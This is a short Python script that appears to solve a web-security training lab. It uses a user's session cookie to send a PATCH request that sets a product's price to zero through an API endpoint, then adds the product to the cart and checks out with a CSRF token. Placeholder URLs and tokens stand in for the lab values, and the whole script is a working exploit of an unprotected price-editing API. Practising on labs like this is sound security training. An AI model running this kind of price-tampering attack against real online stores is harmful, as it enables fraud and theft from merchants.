from wsgiref import headers
import requests
from bs4 import BeautifulSoup
url_path = "<url_access_lab>/api/products/1/price" #url_path_of_lab
headers = {"Content-Type": "application/json; charset=utf-8"}#headers
cookies = {"session": "<cookie_session_of_wiener>"}#cookies
payload = {"price": 0}#payload json to make price = 0 

# Send the PATCH request with the cookie
response = requests.patch(url=url_path, headers=headers, cookies=cookies, json=payload)


print("Response with price parameter and session cookie")
print("Status Code:", response.status_code)
print("Response Body:", response.text)
url_path = "<url_access_lab>/cart" #url_path_of_lab_with_cart
data = {
    "productId": "1",
    "redir": "PRODUCT",
    "quantity": "1"
}
response = requests.post(url=url_path, headers=headers, cookies=cookies, data=data)

# Beautify the response using BeautifulSoup
response_body = BeautifulSoup(response.text, "html.parser").prettify()

# Print the response details
print("Response:")
print("Status Code:", response.status_code)
print(response_body)
url_path = "<url_access_lab>/cart/checkout" #url_path_to_checkout
data = {
    "csrf": "<csrf_token>"
}

response = requests.post(url=url_path, headers=headers, cookies=cookies, data=data)

# Beautify the response using BeautifulSoup
response_body = BeautifulSoup(response.text, "html.parser").prettify()

# Print the response details
print("Response:")
print("Status Code:", response.status_code)
print(response_body)
